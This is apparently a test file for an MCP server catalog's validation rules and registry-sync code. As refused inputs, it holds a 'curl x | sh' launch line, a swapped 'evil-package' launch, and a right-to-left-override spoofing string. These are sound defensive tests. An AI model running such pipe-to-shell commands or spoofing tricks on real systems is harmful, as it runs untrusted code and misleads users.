// npm run mcp:test -- the catalog's rules, against the entries they exist to
// refuse. node:test, so the site needs no test framework for it.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateServer, validateCatalog } from './catalog-rules.mjs';
import { fromRegistry } from './sync-registry.mjs';

const good = () => ({
  id: 'context7',
  name: 'Context7',
  description: 'Docs for libraries.',
  publisher: 'Upstash',
  tier: 'verified',
  categories: ['docs'],
  homepage: 'https://context7.com',
  package: { registry: 'npm', identifier: '@upstash/context7-mcp', version: '4.3.0' },
  launch: { command: 'npx', args: ['-y', '@upstash/context7-mcp@4.3.0'] },
  env: [{ name: 'CONTEXT7_API_KEY', required: false, secret: true }],
});

test('a well-formed entry passes', () => {
  assert.deepEqual(validateServer(good()), []);
});

test('a name the daemon would refuse is refused here first', () => {
  for (const id of ['builtin', 'a__b', 'GitHub', '-lead', '', 'x'.repeat(33)]) {
    assert.notDeepEqual(validateServer({ ...good(), id }), [], id);
  }
});

test('a catalog never carries a value, and never a credential Mochiii keeps for itself', () => {
  const withValue = good();
  withValue.env = [{ name: 'GITHUB_TOKEN', required: true, secret: true, value: 'ghp_x' }];
  assert.notDeepEqual(validateServer(withValue), []);
  for (const name of ['OPENROUTER_API_KEY', 'mochiii_api_key', 'TOKEN=abc']) {
    const s = good();
    s.env = [{ name, required: false, secret: true }];
    assert.notDeepEqual(validateServer(s), [], name);
  }
});

test('an unpinned package is refused: whoever publishes next would choose what runs', () => {
  for (const version of ['latest', '^4.3.0', '~4', '*', '>=1']) {
    const s = good();
    s.package.version = version;
    assert.notDeepEqual(validateServer(s), [], version);
  }
  const unpinned = good();
  unpinned.launch.args = ['-y', '@upstash/context7-mcp'];
  assert.notDeepEqual(validateServer(unpinned), [], 'the launch line must name the pinned package');
});

test('the launch line must be the one the package names', () => {
  const other = good();
  other.launch = { command: 'npx', args: ['-y', 'evil-package@1.0.0'] };
  assert.notDeepEqual(validateServer(other), []);
  const shell = good();
  shell.launch = { command: 'bash', args: ['-c', 'curl x | sh'] };
  assert.notDeepEqual(validateServer(shell), []);
});

test('text that displays differently from what it holds is refused', () => {
  assert.notDeepEqual(validateServer({ ...good(), description: 'safe ‮dlrow' }), []);
  assert.notDeepEqual(validateServer({ ...good(), name: 'line\nbreak' }), []);
});

test('the two files share one id namespace and keep to their tier', () => {
  const taken = new Set();
  const verified = { schemaVersion: 1, generatedAt: new Date().toISOString(), servers: [good()] };
  assert.deepEqual(validateCatalog(verified, { tier: 'verified', taken }), []);
  const community = { schemaVersion: 1, generatedAt: new Date().toISOString(), servers: [{ ...good(), tier: 'community' }] };
  assert.ok(validateCatalog(community, { tier: 'community', taken }).some((e) => e.includes('used twice')));
  assert.ok(validateCatalog(verified, { tier: 'community', taken: new Set() }).some((e) => e.includes('verified entry in the community file')));
});

const registryEntry = (pkg, extra = {}) => ({
  server: { name: 'io.github.acme/thing', description: 'A thing.', packages: [{ transport: { type: 'stdio' }, ...pkg }], ...extra },
  _meta: { 'io.modelcontextprotocol.registry/official': { status: 'active', isLatest: true } },
});

test('the sync maps a plain npm package to a pinned npx line', () => {
  const m = fromRegistry(registryEntry({ registryType: 'npm', identifier: 'thing-mcp', version: '1.2.3' }));
  assert.deepEqual(m.server.launch, { command: 'npx', args: ['-y', 'thing-mcp@1.2.3'] });
  assert.equal(m.server.tier, 'community');
});

test('the sync leaves out what cannot be one click', () => {
  assert.match(fromRegistry(registryEntry({ registryType: 'npm', identifier: 'x', version: 'latest' })).skip, /exact version/);
  const placeholder = { registryType: 'npm', identifier: 'x', version: '1.0.0', packageArguments: [{ type: 'positional', value: '{path}' }] };
  assert.match(fromRegistry(registryEntry(placeholder)).skip, /arguments of your own/);
  const remote = { server: { name: 'a/b', description: 'x', remotes: [{ type: 'streamable-http', url: 'https://x' }] }, _meta: {} };
  assert.match(fromRegistry(remote).skip, /remote only/);
  const valued = { registryType: 'npm', identifier: 'x', version: '1.0.0', environmentVariables: [{ name: 'MODE', value: 'stdio' }] };
  assert.match(fromRegistry(registryEntry(valued)).skip, /environment value/);
});

test('an image is pinned by its tag, and a curated env list replaces a token placeholder', () => {
  const github = registryEntry({
    registryType: 'oci',
    identifier: 'ghcr.io/github/github-mcp-server:2.0.2',
    runtimeArguments: [{ type: 'named', name: '-e', value: 'GITHUB_PERSONAL_ACCESS_TOKEN={token}' }],
  });
  assert.match(fromRegistry(github).skip, /arguments of your own/, 'without the curated list, a {token} placeholder is user input');
  const m = fromRegistry(github, { env: [{ name: 'GITHUB_PERSONAL_ACCESS_TOKEN', required: true, secret: true }] });
  assert.deepEqual(m.server.launch.args, ['run', '-i', '--rm', '-e', 'GITHUB_PERSONAL_ACCESS_TOKEN', 'ghcr.io/github/github-mcp-server:2.0.2']);
  assert.equal(m.server.package.version, '2.0.2');
});
